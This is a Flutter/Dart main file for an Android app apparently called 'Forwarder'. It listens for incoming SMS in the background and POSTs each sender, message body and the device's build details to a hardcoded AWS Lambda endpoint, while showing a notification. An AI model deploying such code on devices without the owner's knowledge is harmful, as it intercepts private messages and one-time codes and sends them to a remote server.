import 'dart:convert';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/material.dart';
import 'package:flutter_codelab/home.dart';
import 'package:flutter_codelab/local_notification.dart';
import 'package:flutter_codelab/mobile.dart';
import 'package:flutter_codelab/permissions.dart';
import 'package:flutter_codelab/utils.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:telephony/telephony.dart';
import 'package:workmanager/workmanager.dart';
import 'package:http/http.dart' as http;

const taskName = 'task';

final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
    FlutterLocalNotificationsPlugin();

void callbackDispatcher() {
  Workmanager().executeTask((taskName, inputData) {
    final Telephony telephony = Telephony.backgroundInstance;
    telephony.listenIncomingSms(
        onNewMessage: (SmsMessage message) {
          LocalNotification.showNotification(
              title: 'Forwarder',
              body: 'Address: ${message.address} | Body: ${message.body}',
              flutterLocalNotificationsPlugin: flutterLocalNotificationsPlugin);
        },
        listenInBackground: true,
        onBackgroundMessage: backgrounMessageHandler);
    return Future.value(true);
  });
}

backgrounMessageHandler(SmsMessage message) async {
  final DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
  Map<String, dynamic> deviceData =
      Mobile().readAndroidBuildData(await deviceInfoPlugin.androidInfo);
  Map<String, String?> body = {
    'sender_address': message.address,
    'device_details': jsonEncode(deviceData),
    'message': message.body
  };
  var url = Uri.parse(
      'https://pdzzplykb4o36pyfx7um2o7rpu0qpwwt.lambda-url.ap-south-1.on.aws');
  final headers = {'Content-Type': 'application/json'};
  await http.post(url, headers: headers, body: json.encode(body));
  LocalNotification.showNotification(
      title: 'Forwarder Background.',
      body: 'Address: ${message.address} | Body: ${message.body}',
      flutterLocalNotificationsPlugin: flutterLocalNotificationsPlugin);
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  LocalNotification.initialize(flutterLocalNotificationsPlugin);

  await Permissions().askSMSPermission();

  await Workmanager().initialize(callbackDispatcher, isInDebugMode: false);
  await Workmanager()
      .registerOneOffTask(Utility().generateRandomString(10), taskName);

  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: Home(),
    );
  }
}
